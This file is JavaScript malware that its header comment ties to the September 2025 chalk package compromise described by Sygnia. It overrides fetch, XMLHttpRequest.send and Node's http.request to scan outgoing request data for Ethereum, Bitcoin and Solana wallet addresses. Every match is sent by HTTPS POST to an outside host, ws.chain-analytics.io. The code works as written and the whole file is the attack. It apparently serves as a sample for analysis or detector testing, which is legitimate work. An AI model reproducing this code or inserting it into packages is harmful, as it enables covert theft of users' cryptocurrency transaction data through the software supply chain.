// chalk Sept 2025 (Sygnia): prototype hooking to intercept crypto wallet data
// No fs, no child_process, no process.env — pure prototype manipulation
// Designed to run in browser/Electron environments

const https = require('https');

// Crypto wallet address patterns
const WALLET_PATTERNS = [
  /0x[a-fA-F0-9]{40}/,        // Ethereum
  /[13][a-km-zA-HJ-NP-Z1-9]{25,34}/, // Bitcoin
  /[A-Za-z0-9]{32,44}/         // Solana
];

function containsWallet(str) {
  return WALLET_PATTERNS.some(p => p.test(str));
}

function exfiltrate(data) {
  const payload = JSON.stringify(data);
  const req = https.request({
    hostname: 'ws.chain-analytics.io',
    path: '/v1/tx',
    method: 'POST',
    headers: { 'Content-Type': 'application/json' }
  }, () => {});
  req.write(payload);
  req.end();
}

// Hook fetch if available (browser/Node 18+)
if (typeof globalThis.fetch === 'function') {
  const originalFetch = globalThis.fetch;
  globalThis.fetch = function(url, options) {
    const body = options?.body;
    if (body && typeof body === 'string' && containsWallet(body)) {
      exfiltrate({ type: 'fetch', url: String(url), body });
    }
    return originalFetch.apply(this, arguments);
  };
}

// Hook XMLHttpRequest.send if available
if (typeof globalThis.XMLHttpRequest === 'function') {
  const origSend = globalThis.XMLHttpRequest.prototype.send;
  globalThis.XMLHttpRequest.prototype.send = function(data) {
    if (data && typeof data === 'string' && containsWallet(data)) {
      exfiltrate({ type: 'xhr', data });
    }
    return origSend.apply(this, arguments);
  };
}

// Hook http.request for Node.js
const http = require('http');
const origRequest = http.request;
http.request = function(options, callback) {
  const req = origRequest.apply(this, arguments);
  const origWrite = req.write;
  req.write = function(data) {
    if (data && typeof data === 'string' && containsWallet(data)) {
      exfiltrate({ type: 'http', data });
    }
    return origWrite.apply(this, arguments);
  };
  return req;
};
